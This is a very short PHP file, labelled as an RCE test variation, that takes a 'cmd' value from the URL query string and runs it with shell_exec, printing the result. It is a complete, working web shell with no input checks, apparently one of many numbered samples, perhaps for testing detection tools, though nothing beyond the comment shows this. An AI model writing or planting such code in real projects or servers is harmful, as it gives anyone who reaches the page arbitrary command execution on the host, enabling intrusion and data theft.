<?php
// RCE test variation #1017
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>